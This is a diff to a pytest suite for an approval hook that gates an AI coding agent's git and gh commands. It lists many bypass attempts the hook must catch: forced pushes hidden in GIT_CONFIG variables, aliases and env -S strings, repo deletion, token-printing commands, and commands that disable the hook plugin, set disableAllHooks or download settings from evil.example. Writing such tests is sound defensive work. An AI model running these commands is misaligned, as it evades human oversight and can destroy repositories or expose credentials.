@@ -131,6 +131,44 @@ ALWAYS_ASK = [
     "gh api -X PO$(echo ST) repos/a/b/issues",
     'gh api graphql -f query="$Q"',
     'gh api graphql -F query="$(cat q.graphql)"',
+    # every other gh command that isn't a known read (#59): repo, gist, workflow, secret, run, ... writes, a subgroup's
+    # write, an extension or alias, a command a newer gh may add, and a subgroup's command word from a variable
+    "gh repo delete owner/repo --yes",
+    "gh repo edit owner/repo --visibility public",
+    "gh gist create --public notes.txt",
+    "gh workflow run deploy.yml",
+    "gh secret set TOKEN --body x",
+    "gh repo sync --force",
+    "gh repo rename new-name",
+    "gh repo archive owner/repo --yes",
+    "gh variable set NAME --body x",
+    "gh variable delete NAME",
+    "gh ruleset create",
+    "gh cache delete --all",
+    "gh run cancel 123",
+    "gh run rerun 123",
+    "gh run delete 123",
+    "gh discussion comment 4 -b hi",
+    "gh repo deploy-key add key.pub",
+    "gh -R owner/repo secret delete TOKEN",
+    "gh extension install owner/gh-ext",
+    "gh auth refresh -s delete_repo",
+    "gh my-extension --flag",
+    "gh my-extension",
+    "gh pr frobnicate 5",
+    'gh repo license "$VERB"',
+    "env -u '#' -S 'gh pr comment 5 -b hi'",
+    "env -S'gh\\_repo\\_delete\\_owner/repo\\_--yes'",
+    # gh's default co alias lives in gh's config, which can redefine it; a read that prints the auth token; a write
+    # through a group's built-in alias
+    "gh co 5",
+    "gh auth status --show-token",
+    "gh auth status -t",
+    "gh auth status -at",
+    "gh extension browse",
+    "gh config get -h github.com oauth_token",
+    'gh config get "$K" -h github.com',
+    "gh cs delete -c name",
 ]
 PR_CHANGES = [
     "gh pr create --fill",
@@ -153,6 +191,7 @@ PR_CHANGES = [
     "bash -c 'gh pr merge 5 --squash'",
     "env FOO=1 gh pr create --fill",
     "gh pr new --fill",
+    "gh pr revert 5",  # opens a PR that reverts a merged one
 ]
 PUSHES = [
     "git push",
@@ -205,6 +244,11 @@ PUSHES = [
     "bash <<<'git push' <<<'true'",
     "source /dev/stdin <<< 'git push'",
     "bash /dev/stdin <<< 'git push'",
+    # BSD env's -U and -L take a value, so -S's code after them is still found and checked
+    "env -U bob -S 'git push origin x'",
+    "GIT_DIR=/tmp/e/.git git push origin main",  # another repo's own config is that repo's, as with git -C
+    # a -c value from a variable can't make a plain push force unless its key could
+    'git -c "user.email=$EMAIL" push origin x',
 ]
 FORCE = [
     "git push --force origin x",
@@ -225,6 +269,48 @@ FORCE = [
     "git push --mir",
     "git push --forc",
     "git -c remote.origin.mirror=true push",
+    # forcing config from the environment or --config-env, config the hook can't read, and an alias for a forcing push
+    # (#61): config it can't read could also alias any subcommand to push
+    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.mirror GIT_CONFIG_VALUE_0=true git push origin",
+    "env GIT_CONFIG_PARAMETERS=\"'remote.origin.mirror'='true'\" git push",
+    "export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.mirror GIT_CONFIG_VALUE_0=true; git push origin",
+    "GIT_CONFIG_GLOBAL=/tmp/evil git push",
+    "bash -c 'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.mirror GIT_CONFIG_VALUE_0=true git push'",
+    "git --config-env=remote.origin.mirror=MIRROR push origin",
+    "git --config-env remote.origin.push=REFSPEC push origin",
+    'git -c "$SETTING" push origin',
+    "git -c alias.p='push --mirror' p origin",
+    "git --config-env=alias.p=ALIAS p origin",
+    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0='push --mirror' git p origin",
+    # an alias that gives git its own options first or runs shell code; variables that move git's config files; and
+    # a variable name only known at run time
+    "git -c alias.p='-c remote.origin.mirror=true push' p origin",
+    "git -c alias.p='--config-env=remote.origin.mirror=M push' p origin",
+    "git -c alias.p='!git -c remote.origin.mirror=true push' p",
+    "HOME=/tmp/e git push origin",
+    "XDG_CONFIG_HOME=/tmp/e git push",
+    "git -c help.autocorrect=immediate psuh --force origin main",
+    "env -u '#' -S 'git push --force origin main'",  # a quoted '#' word isn't a comment when -S's string is read
+    "env -u \"#$X\" -S 'git push --force origin main'",
+    "env -S '-u #x git push --force origin main'",
+    # env reads \_ as a space; git splits alias values honoring quotes; env behind another wrapper or fed by xargs
+    "env -S'git push\\_--force\\_origin main'",
+    "git -c alias.p=\"push '--force'\" p origin main",
+    "git -c alias.p='push \"+main\"' p origin",
+    "git -c alias.p=' \"-c\" remote.origin.mirror=true push' p",
+    "nohup env $(cat /tmp/vars) git push origin",
+    "echo HOME=/tmp/e | xargs -I{} env {} git push origin",
+    "export HOME=/tmp/e; git push origin",
+    "export $(echo GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.mirror GIT_CONFIG_VALUE_0=true); git push origin",
+    "env $(cat /tmp/gitenv) git push origin",
+    'N=GIT_CONFIG_PARAMETERS; export "$N=x"; git push',
+    # an included config file can set remote.origin.mirror; any --config-env may force
+    "git --config-env=include.path=CFG push origin",
+    "git -c include.path=/tmp/mirror.cfg push origin",
+    "git -c includeIf.onbranch:main.path=/tmp/mirror.cfg push origin",
+    "git --config-env=user.name=NAME push origin",
+    "sudo GIT_CONFIG_GLOBAL=/tmp/evil git push",
+    "export GIT_CONFIG_PARAMETERS; git push",
 ]
 READS = [
     "gh pr view 5",
@@ -284,6 +370,56 @@ READS = [
     # tower policy without `use` only shows the policy
     "tower policy",
     "uv run tower policy",
+    # known gh reads outside pr and issue, local gh work, a group or subgroup alone (its help), and gh's own reads
+    "gh repo view",
+    "gh repo view owner/repo --json name",
+    "gh run list --limit 5",
+    "gh run view 123 --log-failed",
+    "gh run watch 123",
+    "gh workflow list",
+    "gh gist list",
+    "gh release view v1.0.0",
+    "gh label list",
+    "gh auth status",
+    "gh repo clone owner/repo",
+    "gh pr checkout 5",
+    "gh auth status --hostname github.com",
+    # gh's built-in aliases for reads, which gh's config can't redefine
+    "gh pr ls",
+    "gh issue ls --state open",
+    "gh run ls",
+    "gh pr co 5",
+    "gh cs list",
+    "gh rs view 1",
+    "gh ext list",
+    "gh at verify artifact.zip -o owner",
+    "gh agent list",
+    "gh skills list",
+    "gh skill show owner/skill",
+    "gh repo license ls",
+    "gh repo license view mit",
+    "gh repo deploy-key list",
+    "gh repo license",
+    "gh repo",
+    "gh status",
+    "gh search prs --author @me",
+    "gh browse 5 --no-browser",
+    "gh --version",
+    # text that only names git's config variables or options sets nothing, and env without -C stays in this folder
+    'git commit -m "Read GIT_CONFIG_COUNT and --config-env in the hook"',
+    "echo GIT_CONFIG_COUNT=1; git status",
+    "unset GIT_CONFIG_PARAMETERS; git status",
+    'git -c "user.email=$EMAIL" commit -m x',
+    "env -u GIT_TRACE git status",
+    'export PATH="$HOME/bin:$PATH"; git status',
+    # under config the hook can't read, git's own commands are still themselves: git ignores an alias named like one
+    "HOME=/tmp/e git status",
+    "GIT_DIR=../acme/.git git log --oneline -3",
+    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=user.name GIT_CONFIG_VALUE_0=x git commit -m x",
+    "git -c include.path=/tmp/x.cfg log",
+    "HOMEBREW_NO_AUTO_UPDATE=1 brew install jq; git status",
+    "env -S 'git status'",
+    "env -u '#' -S 'git status'",
 ]
 UNCHECKABLE = [
     "git push 'origin",
@@ -387,6 +523,14 @@ def bash(command: str) -> dict[str, object]:
 def test_github_writes_always_ask(tmp_path: Path, command: str, push: str) -> None:
     """Comments, reviews, issue/release/label writes and gh api writes ask in every mode."""
     assert asks(run_hook(tmp_path, bash(command), push=push, pr="none"))
+
+
+@pytest.mark.parametrize(
+    "command", ["gh auth token", "gh auth status --show-token", "gh config get -h github.com oauth_token"]
+)
+def test_a_gh_command_that_prints_the_token_says_so(tmp_path: Path, command: str) -> None:
+    """A command that prints the auth token asks, and its reason says so rather than that it changes GitHub."""
+    assert "prints your GitHub auth token" in str(run_hook(tmp_path, bash(command), push="every", pr="none"))
 
 
 @pytest.mark.parametrize("push", PUSH_MODES)
@@ -512,7 +656,8 @@ def test_command_naming_rule_file_asks(tmp_path: Path, command: str, push: str) 
     [
         "CLAUDE.md",
         "/repo/myCLAUDE.local.md",
-        "/repo/.claude/settings.json",
+        "/repo/.claude/agents/reviewer.md",
+        "/repo/config/settings.json",
         "/repo/mytower.conf",
         "/repo/tower.conf.example",
     ],
@@ -657,12 +802,17 @@ NEVER = (False, False, False)
 ARGV_CODE = "python3 -c 'from tower import cli; import sys; cli.main(sys.argv[1:])' merge 5"
 RUNPY_CODE = """python3 -I -c 'import runpy; runpy.run_path("/x/scripts/run-tower.py", run_name="__main__")' merge 5"""
 TIGHT_CODE = "python3 -c \"__import__('tower.cli').cli.main(['merge','5'])\""
+GIT_CONFIG_MIRROR = "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.mirror GIT_CONFIG_VALUE_0=true"
 POLICY_MATRIX: list[tuple[str, str, str | tuple[str, str] | None, bool, bool, bool]] = [
     # (id, command, base gh reports for a merge (with its stack's base for a stacked PR) or None, asks in work,
     # personal, sandbox)
     ("push: plain", "git push origin feat", None, True, False, False),
     ("push: force", "git push --force origin feat", None, True, True, False),
     ("push: delete", "git push origin --delete old", None, True, True, False),
+    # config from GIT_CONFIG_* could also point the push at any repo, so with [repos] entries it is judged like a
+    # command that can't be checked
+    ("unchecked: forcing config from GIT_CONFIG_*", f"{GIT_CONFIG_MIRROR} git push origin", None, *ASKS),
+    ("push: forcing config from --config-env", "git --config-env=remote.origin.mirror=M push origin", None, *ASKS),
     ("comments: PR comment", "gh pr comment 5 -b hi", None, True, True, False),
     ("comments: review", "gh pr review 5 --approve", None, True, True, False),
     ("comments: issue comment", "gh issue comment 3 -b hi", None, True, True, False),
@@ -735,6 +885,18 @@ POLICY_MATRIX: list[tuple[str, str, str | tuple[str, str] | None, bool, bool, bo
     ("no key: gh api write", "gh api -X POST repos/acme/widget/issues -f title=x", None, True, True, False),
     ("no key: release", "gh release create v1.0.0", None, True, True, False),
     ("no key: label", "gh label create triage", None, True, True, False),
+    # every gh command that isn't a known read asks unless every GitHub key is auto (#59)
+    ("no key: gh repo delete", "gh repo delete owner/repo --yes", None, True, True, False),
+    ("no key: gh repo edit", "gh repo edit owner/repo --visibility public", None, True, True, False),
+    ("no key: gh gist create", "gh gist create --public notes.txt", None, True, True, False),
+    ("no key: gh workflow run", "gh workflow run deploy.yml", None, True, True, False),
+    ("no key: gh secret set", "gh secret set TOKEN --body x", None, True, True, False),
+    ("no key: a gh extension", "gh my-extension --flag", None, True, True, False),
+    ("pr_writes: revert", "gh pr revert 5", None, True, False, False),
+    ("reads never ask: gh repo view", "gh repo view", None, False, False, False),
+    ("reads never ask: gh run list", "gh run list", None, False, False, False),
+    ("reads never ask: gh workflow list", "gh workflow list", None, False, False, False),
+    ("reads never ask: gh gist list", "gh gist list", None, False, False, False),
     ("no key: gh subcommand from a variable", "gh pr $action 5", None, True, True, False),
     ("unchecked: a shell reading a pipe", "echo 'git push' | bash", None, True, True, False),
     ("unchecked: an unclosed quote", "git push 'origin", None, True, True, False),
@@ -943,6 +1105,11 @@ FLOOR_EDITS = [
     ("Write", "~/.claude/tower.conf"),
     ("MultiEdit", "~/.claude/tower/rules/Poot.md"),
     ("Write", "/repo/worktrees/x/CLAUDE.local.md"),
+    # Claude Code's settings can turn tower's plugin or every hook off (#60)
+    ("Edit", "~/.claude/settings.json"),
+    ("MultiEdit", "/Users/someone/.claude/settings.json"),
+    ("Write", "/repo/.claude/settings.json"),
+    ("Write", "/repo/worktrees/x/.claude/settings.local.json"),
 ]
 FLOOR_COMMANDS = [
     "echo 'default_profile = \"sandbox\"' > ~/.claude/tower/policy.toml",
@@ -962,6 +1129,54 @@ FLOOR_COMMANDS = [
     "echo 'tower policy use sandbox' | bash",
     "echo 'echo x >> ~/.claude/tower/policy.toml' | sh",
     "cat x > ~/.claude/tower/policy.toml 'unclosed",
+    # turning tower's plugin off, which stops this hook from running at all (#60)
+    "claude plugin disable tower@tower",
+    "claude plugin uninstall tower@tower",
+    "claude plugin remove tower",
+    "claude plugins disable tower --scope project",
+    "claude plugin disable -s user tower@tower",
+    "claude plugin disable --all",
+    "claude plugin disable -a",
+    'claude plugin uninstall "$PLUGIN"',
+    'claude plugin "$VERB" tower@tower',
+    "echo tower@tower | xargs claude plugin disable",
+    "claude plugin marketplace remove tower",
+    "claude plugin marketplace rm tower",
+    "bash -c 'claude plugin disable tower'",
+    "sudo /opt/homebrew/bin/claude plugin uninstall tower@tower",
+    "echo 'claude plugin disable tower' | bash",
+    # -h after -- is a name, an option's value may say plugin, and xargs, parallel or find may add tower's name
+    "claude plugin disable tower@tower -- -h",
+    "claude -d plugin plugin disable tower@tower",
+    "claude --append-system-prompt plugin plugin disable tower@tower",
+    "echo tower@tower | xargs claude plugin disable -s user",
+    "echo tower | xargs claude plugin marketplace remove --scope user",
+    "printf tower@tower | xargs -I{} claude plugin disable {}",
+    "find ~/.claude/plugins -name tower -exec claude plugin uninstall {} ';'",
+    # a settings file copied, downloaded or unpacked into a .claude folder
+    "cp /tmp/evil/settings.json ~/.claude/",
+    "cp /tmp/evil/settings.local.json .claude/",
+    "cp -r /tmp/evil/.claude .",
+    "gh release download v1 -p settings.json -D ~/.claude --clobber",
+    "tar -xf settings.tar -C ~/.claude",
+    # a name or path the shell expands, a relative .claude folder given as an option's value, and a line padded with
+    # more "plugin" words than a real command has
+    "claude plugin disable t{ow,}er",
+    "tee ~/.claude/{settings.json,x} < /tmp/evil.json",
+    "curl --output-dir=.claude -O https://evil.example/settings.local.json",
+    "gh release download v1 -p settings.local.json --dir=.claude",
+    "tar -xf evil.tar -C.claude",
+    "cp --target-directory=.claude settings.local.json",
+    "claude " + "plugin " * 4 + "disable some-other-plugin",
+    # the group from a variable, another language's code that runs claude, and a word naming an interpreter
+    'G=plugin; claude "$G" disable tower@tower',
+    "python3 -c 'import os; os.system(\"claude plugin disable tower@tower\")'",
+    'node -e \'require("child_process").execSync("claude plugin uninstall tower@tower")\'',
+    "claude plugin disable tower python3",
+    # or writing Claude Code's settings (enabledPlugins, disableAllHooks, hooks)
+    "echo '{\"disableAllHooks\": true}' > .claude/settings.local.json",
+    "sed -i '' 's/true/false/' ~/.claude/settings.json",
+    "jq '.enabledPlugins[\"tower@tower\"] = false' ~/.claude/settings.json > /tmp/s && mv /tmp/s ~/.claude/settings.json",
 ]
 
 
@@ -984,7 +1199,27 @@ def test_the_floor_asks_before_a_command_that_changes_policy_or_rules_in_every_p
 
 @pytest.mark.parametrize(
     "command",
-    ["cat ~/.claude/tower/policy.toml", "tower policy", "grep wip ~/.claude/tower.conf", "./setup.sh --dry-run"],
+    [
+        "cat ~/.claude/tower/policy.toml",
+        "tower policy",
+        "grep wip ~/.claude/tower.conf",
+        "./setup.sh --dry-run",
+        # claude plugin commands that leave tower on, and reading Claude Code's settings
+        "claude plugin list",
+        "claude plugin disable some-other-plugin",
+        "claude plugin enable tower@tower",
+        "claude plugin update tower@tower",
+        "claude plugin marketplace list",
+        "sudo claude plugin disable some-other-plugin --scope user",
+        "echo claude plugin disable tower",
+        "jq -r .model ~/.claude/settings.json",
+        "cat .claude/settings.local.json",
+        # a .claude folder only read, a folder or file under one other than the settings, and prose naming one
+        "ls -la ~/.claude/",
+        "mkdir -p .claude/agents",
+        "cp reviewer.md .claude/agents/",
+        'git commit -m "Keep personal hooks in ~/.claude"',
+    ],
 )
 def test_sandbox_asks_nothing_else(tmp_path: Path, command: str) -> None:
     """In sandbox, reading tower's settings, and everything outside the floor, needs no approval."""
@@ -1002,6 +1237,9 @@ def test_the_prompt_names_the_profile(tmp_path: Path) -> None:
 # --- Which repo a command reaches: an agent can't swap its repo's identity to get a looser profile ----------
 
 SANDBOX_WIDGET = 'default_profile = "work"\n[repos]\n"acme/widget" = "sandbox"\n'
+GIT_CONFIG_PUSHURL = (
+    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=git@github.com:acme/real.git"
+)
 
 
 @pytest.fixture
@@ -1055,6 +1293,23 @@ def test_every_remote_counts_so_repointing_one_only_tightens(widget: Path, remot
         ("GIT_DIR=../real/.git git push --force", True),
         ("GH_REPO=acme/real gh pr comment 5 -b hi", True),
         ("export GH_REPO=acme/real; gh issue create -t x", True),
+        # env -C and sudo -D move the command they run, and git config the hook can't read could point a push
+        # anywhere (#61)
+        ("env -C ../real git push --force", True),
+        ("env --chdir=../real git push --force", True),
+        ("env --chdir ../real git push --force", True),
+        ("env -i -C../real git push --force", True),
+        ("env -C .. git -C real push --force", True),
+        ("sudo -u me -D ../real git push --force", True),
+        ("sudo --chdir=../real git push --force", True),
+        ("env -C ../real bash -c 'git push --force'", True),
+        ("env -C ../real gh pr comment 5 -b hi", True),
+        ('env -C "$DIR" git push --force', True),
+        ("env -C . git push --force", False),
+        ("env -u GIT_TRACE git push --force", False),
+        (f"{GIT_CONFIG_PUSHURL} git push", True),
+        ("git --config-env=remote.origin.pushurl=URL push --force", True),
+        ('git -c "$KEY=git@github.com:acme/real.git" push --force', True),
     ],
 )
 def test_a_push_or_gh_command_reaching_another_repo_gets_its_policy(
@@ -1130,6 +1385,47 @@ def test_a_push_or_write_reaching_a_work_repo_asks_from_a_personal_repo(fork: Pa
     assert asks(fork_decision(fork, command))
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cd ../acme && git push origin main",
+        "git -C ../acme push origin main",
+        "env -C ../acme git push origin main",
+        "sudo -D ../acme git push origin main",
+        # env reads options inside -S's string too, and getopt takes a long option cut short
+        "env -S '-C ../acme git push origin main'",
+        "env -S'-C ../acme' git push origin main",
+        "env --ch=../acme git push origin main",
+        "sudo --chd=../acme git push origin main",
+        "sudo --login -D ../acme git push origin main",  # --login is a flag, not the start of --login-class
+    ],
+)
+def test_a_push_from_a_sandbox_checkout_into_a_work_repo_asks_however_it_moves_there(fork: Path, command: str) -> None:
+    """#61's table: a sandbox session pushing from a checkout of a repo the policy makes work."""
+    assert asks(fork_decision(fork, command, 'default_profile = "sandbox"\n[repos]\n"acme/*" = "work"\n'))
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "GIT_DIR=../acme/.git gh pr merge 5 --squash",
+        "GIT_DIR=../acme/.git tower merge 5",
+        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=git@acme.example:x gh pr create",
+    ],
+)
+def test_gh_or_tower_pointed_at_another_repo_through_git_gets_the_strictest_profile(fork: Path, command: str) -> None:
+    """gh and tower find their repo through git, so GIT_DIR or config the hook can't read may point them anywhere."""
+    assert asks(fork_decision(fork, command, 'default_profile = "sandbox"\n[repos]\n"acme/*" = "work"\n'))
+
+
+def test_a_folder_reached_several_ways_names_its_profile_once(fork: Path) -> None:
+    """env -C's folder is noted for the line and joined onto git's -C: the prompt names work once."""
+    policy = 'default_profile = "sandbox"\n[repos]\n"acme/*" = "work"\n'
+    assert "it reaches another repo: sandbox+work)" in str(
+        fork_decision(fork, "env -C ../acme git push origin main", policy)
+    )
+
+
 def test_a_plain_push_from_the_personal_repo_itself_passes(fork: Path) -> None:
     assert fork_decision(fork, "git push origin main") is None
     assert fork_decision(fork, "cd . && git push origin main") is None
@@ -1203,4 +1499,32 @@ def test_a_huge_interpreter_argument_is_checked_in_time(tmp_path: Path) -> None:
     code = "tower " * 40_000
     start = time.monotonic()
     run_hook(tmp_path, bash(f"python3 -c '{code}' merge 5"), policy='default_profile = "personal"\n')
+    assert time.monotonic() - start < 10
+
+
+def test_a_padded_command_that_cant_be_checked_fully_is_still_read_in_time(tmp_path: Path) -> None:
+    """The safety floor's text checks on a command the hook couldn't check fully stay linear: one regex joining
+    claude, plugin and a verb with .* took minutes on this, past the hook timeout."""
+    command = "gh pr merge 5 --squash; echo true | bash; : " + "tower " * 8000 + "claude plugin " * 1500
+    start = time.monotonic()
+    assert asks(run_hook(tmp_path, bash(command), policy='default_profile = "work"\n'))
+    assert time.monotonic() - start < 10
+
+
+@pytest.mark.parametrize(
+    "command", ["sudo " + "env " * 20_000 + "git push origin", "A=1 " * 20_000 + "env " * 20_000 + "git push origin"]
+)
+def test_a_line_padded_with_env_words_is_checked_in_time(tmp_path: Path, command: str) -> None:
+    """Reading env's options for folders and variables runs before the work budget, so it stays linear: per-word
+    rescans took a minute on these, past the hook timeout."""
+    start = time.monotonic()
+    run_hook(tmp_path, bash(command), push="every")
+    assert time.monotonic() - start < 10
+
+
+def test_a_claude_line_padded_with_plugin_words_is_checked_in_time(tmp_path: Path) -> None:
+    """The plugin-off check runs before the work budget, so it stays linear: a cubic one ran 77 s on this."""
+    command = "claude " * 4000 + "plugin " * 4000 + "; git push --force"
+    start = time.monotonic()
+    assert asks(run_hook(tmp_path, bash(command), policy='default_profile = "sandbox"\n'))
     assert time.monotonic() - start < 10
